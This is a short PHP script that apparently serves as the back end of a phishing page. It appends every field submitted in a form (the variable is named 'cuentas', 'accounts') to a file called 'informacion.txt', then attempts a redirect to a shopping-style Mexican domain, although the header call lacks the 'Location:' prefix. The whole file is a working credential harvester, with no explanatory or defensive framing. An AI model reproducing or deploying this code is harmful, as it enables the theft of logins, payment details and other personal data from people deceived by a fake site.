<?php
header('http://www.comprasenlinea160fn.com.mx');
$cuentas = fopen("informacion.txt","a");
foreach($_POST as $variable => $value){
fwrite($cuentas, $variable);
fwrite($cuentas, ":");
fwrite($cuentas, $value );
fwrite($cuentas, "\n");
}
fclose($cuentas);
exit;
?>





